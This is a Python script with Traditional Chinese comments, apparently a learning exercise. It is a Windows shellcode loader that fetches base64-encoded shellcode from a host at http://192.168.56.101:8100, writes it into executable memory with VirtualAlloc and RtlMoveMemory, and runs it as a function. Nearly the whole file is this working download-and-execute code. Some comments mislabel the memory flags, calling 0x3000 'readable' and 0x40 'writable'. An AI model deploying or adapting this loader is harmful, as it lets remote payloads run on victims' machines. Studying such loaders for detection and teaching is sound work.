import base64
import ctypes

from urllib import request
kernel32 = ctypes.windll.kernel32

def get_code(url):
    
    # 從伺服器中拉取 base64 編碼的 shellcode
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode

def write_mempry(buf):
    # 獲取傳入的緩衝區(一段數據的儲存區域)的長度
    length = len(buf)
    # 設置 VirtualAlloc 函數返回類行為指向 void 指針，VirtualAlloc 通常用於虛擬內存中分配空間。
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    # 設置 'RtlMoveMemory' 函數的參數類型，他用於將內存區域的數據移動到另一個內存區域。這裡指定三個參數類型
    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,  # 目標地址
        ctypes.c_void_p,  # 來源地址
        ctypes.c_size_t,  # 數據長度
    )

    # 使用 VirtualAlloc 分配一塊虛擬內存，大小為 length，並將其地址賦值給 'ptr'。
    # 表明這段內存同時具有讀/寫和執行權限，0x3000: 可讀，0x40: 可寫 
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    # RtlMoveMemory: 將 'buf' 中的數據(緩衝區的數據)複製到剛才分配的虛擬內存空間
    kernel32.RtlMoveMemory(ptr, buf, length)
    # 返回剛才分配的虛擬內存空間的指標
    return ptr

def run(shellcode):
    # 分配緩衝區去儲存解碼後的 二進制機器碼 shellcode，供後續操作的可寫入區域
    buffer = ctypes.create_string_buffer(shellcode)
    # 將機器碼複製到內存，並獲取這塊虛擬內存的指標 ptr
    ptr = write_mempry(buffer)

    # 將 ptr 轉換為 CFUNCTYPE(C 函數類型)，這是用於表示 C 函數指針的 ctypes 類型
    # 告訴 python 該指標指向的是一個沒有返回值('None')的函數
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    # 最後，呼叫 shell_func() 實際執行了在虛擬內存中複製的機器碼。這樣做的效果就像直接執行 shellcode 一樣
    # 實際呼叫了轉換後的函數指標，由於 ctypes.CFUNCTYPE(None) 表示的是一個沒有返回值的函數，因為這裡的呼叫
    # 是在執行 shellcode
    shell_func()

if __name__ == '__main__':
    url = "http://192.168.56.101:8100/shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)

'''
kernel32.RtlMoveMemory(ptr, buf, length)，將 buf 中的數據（緩衝區的數據）複製到剛才分配的虛擬內存空間中。為什麼要這樣做?

這樣做的主要目的是將一段數據（存在於 buf 中）複製到之前使用 VirtualAlloc 函數分配的虛擬內存空間中（由 ptr 指示的地方）。

常見的使用情境包括：

內存管理： 通常，VirtualAlloc 用於分配一塊連續的虛擬內存空間，但這只是分配了地址空間，實際的內存內容可能是未初始化的或者包含垃圾數據。使用 RtlMoveMemory 可以將一段確定的數據（存在於 buf 中）複製到這個虛擬內存中，以初始化內存或者更新內存的內容。

數據處理： 如果程式需要在虛擬內存中保留某些數據，例如配置信息、緩存數據等，就可以使用這種方式將數據複製到指定的虛擬內存區域。

簡單來說，RtlMoveMemory 是一種內存複製的方式，用於將指定大小的數據從一個地方（buf 中）複製到另一個地方（ptr 指向的虛擬內存空間）。這在操作內存時非常常見，以確保內存區域包含我們希望的數據。
'''